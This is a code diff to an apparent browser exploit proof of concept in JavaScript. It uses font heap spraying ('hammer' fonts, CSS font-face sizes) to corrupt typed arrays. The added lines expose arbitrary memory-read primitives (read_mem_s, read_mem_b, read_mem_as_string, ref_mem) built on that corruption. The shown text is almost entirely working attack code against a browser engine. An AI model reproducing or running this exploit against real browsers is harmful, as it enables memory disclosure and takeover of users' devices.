@@ -3,13 +3,20 @@ var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
 var SPRAY_FONTS = 0x100a;
-var GUESS_FONT = 0x200430000;
+var GUESS_FONT = 8602845184;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
+
+function hex(n)
+{
+    if((typeof n) != "number")
+        return ""+n;
+    return "0x" + (new Number(n)).toString(16);
+}
 
     var union = new ArrayBuffer(8);
     var union_b = new Uint8Array(union);
@@ -319,6 +326,35 @@ function poc() {
         i48_put(p, arw_master);
         arw_master[6] = sz;
     }
+    
+    window.read_mem_s = function(p, sz)
+{
+    read_mem_setup(p, sz);
+    return ""+arw_slave;
+}
+
+window.read_mem_b = function(p, sz)
+{
+    read_mem_setup(p, sz);
+    var b = new Uint8Array(sz);
+    b.set(arw_slave);
+    return b;
+}
+
+window.read_mem_as_string = function(p, sz)
+{
+    var x = read_mem_b(p, sz);
+    var ans = '';
+    for(var i = 0; i < x.length; i++)
+        ans += String.fromCharCode(x[i]);
+    return ans;
+}
+
+window.ref_mem = function(p, sz)
+{
+    read_mem_setup(p, sz);
+    return arw_slave;
+}
 
     window.read_mem = function (p, sz) {
         read_mem_setup(p, sz);
